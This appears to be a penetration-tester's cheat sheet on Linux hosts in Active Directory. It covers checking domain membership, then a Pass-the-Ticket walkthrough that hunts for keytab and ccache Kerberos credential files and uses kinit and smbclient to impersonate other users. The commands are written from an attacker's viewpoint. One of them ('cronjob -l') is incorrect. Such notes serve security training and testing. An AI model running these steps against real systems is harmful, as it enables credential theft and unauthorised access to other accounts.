
## 1. Check Domain Joined or Not

- We can identify a Linux machine is domain joined or not by using the `realm` tool. Domain joined means whether the particular machine is associated with the Active Directory network or is basically an user in that AD network or Kerberos member which would associate the machine to be part of the AD network.
- If the `realm` tool is not present then the presence of services like `sssd` and `winbind` would infer association with AD environment.

### using `realm`

```bash
realm list
```

### checking `sssd` and `winbind` services

```bash
ps -ef | grep -i "winbind\|sssd"
```

---
## Pass the Ticket (PtT) in Linux
#### STEP 1 : Finding the Kerberos Tickets

As an attacker we are always going to be more interested about finding credentials. On Linux based systems we need to find the **Kerberos tickets** to gain more access. **Kerberos tickets** can be found in different places depending on the Linux implementation or administrator changing the default settings. So the **Kerberos tickets** can be found using the following stuff. They are :-
 - Finding the `keytab` files.
 - Finding the `ccache` files.

##### a) Finding `keytab`
##### using `find` to search for files with `keytab` in the name

```bash
find / -name *keytab* -ls 2>/dev/null
```

##### identifying `keytab` in `cronjobs`

```bash
cronjob -l
```


##### a) Finding `ccache`

###### Reviewing environment variables for `ccache` files

```bash
env | grep -i krb5
```

###### Searching for `ccache` files in `/tmp`

```bash
ls -la /tmp
```

#### STEP 2 : Exploiting 

- If we found a legit `keytab` we can use its contents or credentials inside to impersonate as another user. We can use `kinit` tool for this but we also need to know for which user that `keytab` file was created for 


##### Listing the `keytab` file information

```bash
klist -k -t <keytab_file_path>
```

##### Impersonation using `keytab` info

- `PRINCIPAL_NAME` is the user account's name in the Kerberos realm or the Active Directory network.
- Also provide the `keytab` file path of that respective user only not any other random `keytab` file paths.
- If the impersonation was successful, we would be able to access files/folders privileged or accessible by the user we just impersonated.

```bash
kinit <PRINCIPAL_NAME> -k -t <keytab_file_path>
```

##### Connecting to SMB Client 

- `-k` used to authenticate to the SMB client network using the Kerberos ticket.
- `-c` used to execute a command upon login and exit. This is one shot, that's why we use the switch.

```bash
smbclient <NETWORK_SHARE> -c <COMMAND_TO_EXECUTE_UPON_LOGIN> # this command is one time
```















